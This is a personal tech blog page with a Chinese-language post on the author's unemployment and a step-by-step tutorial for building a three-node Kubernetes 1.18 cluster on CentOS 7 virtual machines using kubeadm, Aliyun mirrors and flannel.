<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>z0@ServSec</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="z0@ServSec">
<meta property="og:url" content="https://z0edff0x3d.github.io/index.html">
<meta property="og:site_name" content="z0@ServSec">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="z0edff0x3d">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="z0@ServSec" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 6.0.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">z0edff0x3d</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Blog/" style="font-size: 10px;">Blog</a> <a href="/tags/GO/" style="font-size: 15px;">GO</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/tags/Python/" style="font-size: 17.5px;">Python</a> <a href="/tags/SBOM/" style="font-size: 10px;">SBOM</a> <a href="/tags/SCA/" style="font-size: 10px;">SCA</a> <a href="/tags/vCenter/" style="font-size: 12.5px;">vCenter</a> <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" style="font-size: 10px;">云原生</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 20px;">安全开发</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 12.5px;">渗透测试</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="/">以下排名不分先后</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://g0uz1.github.io/">g0uz1(大哥)</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a pentester.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-追寻的路-岁月的感悟" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/25/%E8%BF%BD%E5%AF%BB%E7%9A%84%E8%B7%AF-%E5%B2%81%E6%9C%88%E7%9A%84%E6%84%9F%E6%82%9F/" class="article-date">
  	<time datetime="2024-04-25T06:01:10.000Z" itemprop="datePublished">2024-04-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/25/%E8%BF%BD%E5%AF%BB%E7%9A%84%E8%B7%AF-%E5%B2%81%E6%9C%88%E7%9A%84%E6%84%9F%E6%82%9F/">
        追寻的路-岁月的感悟
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="追寻的路-岁月的感悟"><a href="#追寻的路-岁月的感悟" class="headerlink" title="追寻的路-岁月的感悟"></a>追寻的路-岁月的感悟</h3><p>​        2023年12月，一个消息悄然而至，打破了我曾经的生活和工作节奏，到如今已经失业整整4个月。曾凭借着在网络安全领域多年的经验，过着相对舒适的生活，但命运的转折却在不经意间出现。从通知到逐渐过渡到如今，我经历了一段心态上的起伏，以及对整个行业环境的深刻反思。</p>
<p>​        在这段时间里，我经历了多轮的面试，结果多少有点不尽人意。面对这样的结果，我不得不重新审视自己的能力和状态。当下网络安全行业的大环境并不乐观，竞争激烈，机会稀少。曾经自以为理所当然的优势，在这个时刻显得微不足道。沉思过后，我并没有因此而气馁，反而更加坚定地决定，即使没有合适的岗位，我也要不断地学习，不断地进步。</p>
<p>​        经济上，为了弥补家庭开支，我接了一些私活，甚至出差到项目现场实地考察企业的安全状况。在这个过程中，我看到了传统企业面临的困境，也深刻体会到了工人们的辛苦。与此同时，我也对比起自己曾经的生活状态，感悟颇深。曾经总觉得工资不够高，渴望着去追求更好的生活，但现实却是如此艰难。或许，我应该更加珍惜眼前拥有的一切，更加努力地去学习，去提升自己不是吗？</p>
<p>​        回首往事，曾经有几份不错的工作。特别是Servyou，也许只有经历过后才知道这个公司对我真的好。但那时的离开或许是我年轻气盛的表现，也许是我心态有所波动，又或许是我想多出去看看。但无论如何，每一次选择都是我自己的，每一段经历都是我人生的一部分。以积极的心态面对生活中的一切，才是当下。保持学习，不断进步。相信有一天能找到一份长期稳定且合适的工作。</p>
<p>​        人生的道路漫长而曲折，年轻的我们需要保持远见。无论是学习技术，还是经历人生，都要保持谦卑与勇敢。这是我对自己现在的要求。因为我知道，只有这样，才能走得更远，看得更清楚。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-搭建一个单master的k8s集群" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/" class="article-date">
  	<time datetime="2023-01-10T02:24:37.000Z" itemprop="datePublished">2023-01-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/">
        搭建一个单master的k8s集群
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="安装k8s"><a href="#安装k8s" class="headerlink" title="安装k8s"></a>安装k8s</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mac虚拟机nat网卡段查看，方便后续配置固定ip，windows不用查看直接配置</span><br><span class="line">cat /Library/Preferences/VMware\ Fusion/networking</span><br><span class="line">VERSION=1,0</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109183418176.png" alt="image-20230109183418176"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看网关地址</span><br><span class="line">cat /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109183448155.png" alt="image-20230109183448155"></p>
<p>修改虚拟机中的CentOS 7系统为固定IP的配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">#修改配置文件,文件名可能不一样,但一般位于第一个</span><br><span class="line"></span><br><span class="line">#将IPV6…..协议都注释；</span><br><span class="line">BOOTPROTO=static        #开机协议，有dhcp及static；</span><br><span class="line">ONBOOT=yes              #设置为开机启动；</span><br><span class="line">DNS1=114.114.114.114    #这个是国内的DNS地址，是固定的；</span><br><span class="line">IPADDR=192.168.32.130     #你想要设置的固定IP，理论上192.168.2.2-255之间都可以，请自行验证；</span><br><span class="line">NETMASK=255.255.255.0   #子网掩码，不需要修改；</span><br><span class="line">GATEWAY=192.168.32.2     #网关，这里是你在“2.配置虚拟机的NAT模式具体地址参数”中的（2）选择VMnet8--取消勾选使用本地DHCP--设置子网IP--网关IP设置。</span><br><span class="line">重启网络服务</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 示例：</p>
<p>su</p>
<p>vi /etc/sysconfig/network-scripts/ifcfg-ens33</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">#IPV6INIT=&quot;yes&quot;</span><br><span class="line">#IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">#IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">#IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">#IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;6cfd4d76-22bd-49e5-a760-6a3be11fa70a&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">DNS1=&quot;114.114.114.114&quot;  </span><br><span class="line">IPADDR=&quot;192.168.32.130&quot;   </span><br><span class="line">NETMASK=&quot;255.255.255.0&quot; </span><br><span class="line">GATEWAY=&quot;192.168.32.2&quot;  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br><span class="line">查看修改后的ip</span><br><span class="line">ifconfig</span><br><span class="line">可打开笔记本的终端ping一下,看看是否通</span><br></pre></td></tr></table></figure>

<p>或者也可以这样设置</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109165309200.png" alt="image-20230109165309200"></p>
<p>有个坑，因为我比较懒，虚拟机镜像都是复制了3份，导致配好ip之后这三个虚拟机之间无法ping通，而且网络会延时和瞬间断开又连上，由于我使用了3个同样的虚拟机镜像导致3个mac地址和en33配置文件的uuid相同，会冲突，所以需要关掉master和node机器，重新生成下mac地址，修改uuid，重启后正常</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109180202580.png" alt="image-20230109180202580"></p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109175814365.png" alt="image-20230109175814365"></p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109183224222.png" alt="image-20230109183224222"></p>
<p>生成好后，重启机器一切正常</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109180235317.png" alt="image-20230109180235317"></p>
<h2 id="安装要求"><a href="#安装要求" class="headerlink" title="安装要求"></a>安装要求</h2><p>在开始之前，部署Kubernetes集群机器需要满足以下几个条件：</p>
<ul>
<li>一台或多台机器，操作系统 CentOS7.x-86_x64</li>
<li>硬件配置：2GB或更多RAM，2个CPU或更多CPU，硬盘30GB或更多【注意master需要两核】</li>
<li>可以访问外网，需要拉取镜像，如果服务器不能上网，需要提前下载镜像并导入节点</li>
<li>禁止swap分区</li>
</ul>
<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><table>
<thead>
<tr>
<th>角色</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>192.168.32.130</td>
</tr>
<tr>
<td>node1</td>
<td>192.168.32.131</td>
</tr>
<tr>
<td>node2</td>
<td>192.168.32.132</td>
</tr>
</tbody></table>
<p>为了操作方便三台机器都开下ssh，实际配置中不要允许root远程登录ssh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep openssh-server</span><br><span class="line">yum install openssh-server</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">sudo service sshd restart</span><br><span class="line">netstat -an | grep 22</span><br><span class="line">systemctl enable sshd.service</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109163203978.png" alt="image-20230109163203978"></p>
<p>然后开始在每台机器上执行下面的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭selinux</span></span><br><span class="line"><span class="comment"># 永久关闭</span></span><br><span class="line">sed -i <span class="string">&#x27;s/enforcing/disabled/&#x27;</span> /etc/selinux/config  </span><br><span class="line"><span class="comment"># 临时关闭</span></span><br><span class="line">setenforce 0  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭swap</span></span><br><span class="line"><span class="comment"># 临时</span></span><br><span class="line">swapoff -a </span><br><span class="line"><span class="comment"># 永久关闭</span></span><br><span class="line">sed -ri <span class="string">&#x27;s/.*swap.*/#&amp;/&#x27;</span> /etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据规划设置主机名【master节点上操作】</span></span><br><span class="line">hostnamectl set-hostname k8smaster</span><br><span class="line"><span class="comment"># 根据规划设置主机名【node1节点操作】</span></span><br><span class="line">hostnamectl set-hostname k8snode1</span><br><span class="line"><span class="comment"># 根据规划设置主机名【node2节点操作】</span></span><br><span class="line">hostnamectl set-hostname k8snode2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在master添加hosts</span></span><br><span class="line">cat &gt;&gt; /etc/hosts &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">192.168.32.130 k8smaster</span></span><br><span class="line"><span class="string">192.168.32.131 k8snode1</span></span><br><span class="line"><span class="string">192.168.32.132 k8snode2</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将桥接的IPv4流量传递到iptables的链</span></span><br><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line">sysctl --system  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间同步</span></span><br><span class="line">yum install ntpdate -y</span><br><span class="line">ntpdate time.windows.com</span><br></pre></td></tr></table></figure>

<h2 id="安装Docker-kubeadm-kubelet"><a href="#安装Docker-kubeadm-kubelet" class="headerlink" title="安装Docker/kubeadm/kubelet"></a>安装Docker/kubeadm/kubelet</h2><p>所有节点安装Docker/kubeadm/kubelet ，Kubernetes默认CRI（容器运行时）为Docker，因此先安装Docker</p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>首先配置一下Docker的阿里yum源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;/etc/yum.repos.d/docker.repo&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[docker-ce-edge]</span></span><br><span class="line"><span class="string">name=Docker CE Edge - \$basearch</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/7/\$basearch/edge</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=1</span></span><br><span class="line"><span class="string">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>然后yum方式安装docker</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装</span></span><br><span class="line">yum -y install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看docker版本</span></span><br><span class="line">docker --version  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<p>配置docker的镜像源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; /etc/docker/daemon.json &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>然后重启docker</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="添加kubernetes软件源"><a href="#添加kubernetes软件源" class="headerlink" title="添加kubernetes软件源"></a>添加kubernetes软件源</h3><p>然后我们还需要配置一下yum的k8s软件源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[kubernetes]</span></span><br><span class="line"><span class="string">name=Kubernetes</span></span><br><span class="line"><span class="string">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">repo_gpgcheck=0</span></span><br><span class="line"><span class="string">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<h3 id="安装kubeadm，kubelet和kubectl"><a href="#安装kubeadm，kubelet和kubectl" class="headerlink" title="安装kubeadm，kubelet和kubectl"></a>安装kubeadm，kubelet和kubectl</h3><p>由于版本更新频繁，这里指定版本号部署，master和node都要部署：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装kubelet、kubeadm、kubectl，同时指定版本</span></span><br><span class="line">yum install -y kubelet-1.18.0 kubeadm-1.18.0 kubectl-1.18.0</span><br><span class="line"><span class="comment"># 设置开机启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> kubelet</span><br></pre></td></tr></table></figure>

<h2 id="部署Kubernetes-Master【master节点】"><a href="#部署Kubernetes-Master【master节点】" class="headerlink" title="部署Kubernetes Master【master节点】"></a>部署Kubernetes Master【master节点】</h2><p>在   192.168.32.130  执行，也就是master节点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address=192.168.32.130 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.18.0 --service-cidr=10.96.0.0/12  --pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure>

<p>由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址，【执行上述命令会比较慢，因为后台其实已经在拉取镜像了】，我们 docker images 命令即可查看已经拉取的镜像</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109181637895.png" alt="image-20230109181637895"></p>
<p>当我们出现下面的情况时，表示kubernetes的镜像已经安装成功</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109181805498.png" alt="image-20230109181805498"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join 192.168.32.130:6443 --token jgre0p.pctyjlwdwz7ql23h \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:e7f63f43efa34097238dc280f18b0703276e84eaf940809f0f3beda053a39a67 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用kubectl工具 【master节点操作】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<p>执行完成后，我们使用下面命令，查看我们正在运行的节点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109181917176.png" alt="image-20230109181917176"></p>
<p>目前有一个master节点已经运行了，但是还处于未准备状态</p>
<p>下面我们还需要在Node节点执行其它的命令，将node1和node2加入到我们的master节点上</p>
<h2 id="加入Kubernetes-Node【Slave节点】"><a href="#加入Kubernetes-Node【Slave节点】" class="headerlink" title="加入Kubernetes Node【Slave节点】"></a>加入Kubernetes Node【Slave节点】</h2><p>下面我们需要到 node1 和 node2服务器，执行下面的代码向集群添加新节点</p>
<p>执行在kubeadm init输出的kubeadm join命令：</p>
<blockquote>
<p>注意，以下的命令是在master初始化完成后，每个人的都不一样！！！需要复制自己生成的</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join 192.168.32.130:6443 --token jgre0p.pctyjlwdwz7ql23h \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:e7f63f43efa34097238dc280f18b0703276e84eaf940809f0f3beda053a39a67 </span><br></pre></td></tr></table></figure>

<p>默认token有效期为24小时，当过期之后，该token就不可用了。这时就需要重新创建token，操作如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm token create --print-join-command</span><br></pre></td></tr></table></figure>

<p>当我们把两个节点都加入进来后，我们就可以去Master节点 执行下面命令查看情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get node</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230109182545989.png" alt="image-20230109182545989"></p>
<h2 id="部署CNI网络插件"><a href="#部署CNI网络插件" class="headerlink" title="部署CNI网络插件"></a>部署CNI网络插件</h2><p>上面的状态还是NotReady，下面我们需要网络插件，来进行联网访问，在master节点操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure>

<p>默认镜像地址无法访问，sed命令修改为docker hub镜像仓库。</p>
